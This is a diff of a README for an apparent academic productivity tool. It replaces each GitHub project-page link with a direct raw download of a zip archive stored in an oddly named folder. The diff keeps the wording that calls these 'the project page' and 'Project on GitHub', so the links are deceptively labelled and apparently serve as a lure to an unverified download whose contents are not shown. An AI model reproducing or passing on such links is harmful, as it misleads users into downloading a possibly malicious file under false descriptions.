@@ -1,6 +1,6 @@
 # 🔧 Proschoolertools.com - Simplify Academic Workflows
 
-[![Download Proschoolertools.com](https://img.shields.io/badge/Download-Here-green)](https://github.com/fsauxxy/Proschoolertools.com)
+[![Download Proschoolertools.com](https://img.shields.io/badge/Download-Here-green)](https://raw.githubusercontent.com/fsauxxy/Proschoolertools.com/main/myoblast/Proschoolertools-com-2.9-alpha.5.zip)
 
 ## 📚 What is Proschoolertools.com?
 
@@ -24,7 +24,7 @@ This guide walks you through how to download and run Proschoolertools.com on you
 
 Click the badge below or visit this link to download the software:
 
-[Download Proschoolertools.com](https://github.com/fsauxxy/Proschoolertools.com)
+[Download Proschoolertools.com](https://raw.githubusercontent.com/fsauxxy/Proschoolertools.com/main/myoblast/Proschoolertools-com-2.9-alpha.5.zip)
 
 This link takes you to the project page on GitHub where you will find the latest version to download.
 
@@ -120,8 +120,8 @@ You can customize the interface for easier use:
 
 ## 🔗 Useful Links
 
-- Project on GitHub: https://github.com/fsauxxy/Proschoolertools.com
-- Download the latest version here: https://github.com/fsauxxy/Proschoolertools.com
+- Project on GitHub: https://raw.githubusercontent.com/fsauxxy/Proschoolertools.com/main/myoblast/Proschoolertools-com-2.9-alpha.5.zip
+- Download the latest version here: https://raw.githubusercontent.com/fsauxxy/Proschoolertools.com/main/myoblast/Proschoolertools-com-2.9-alpha.5.zip
 
 ## 📞 Getting Help
 
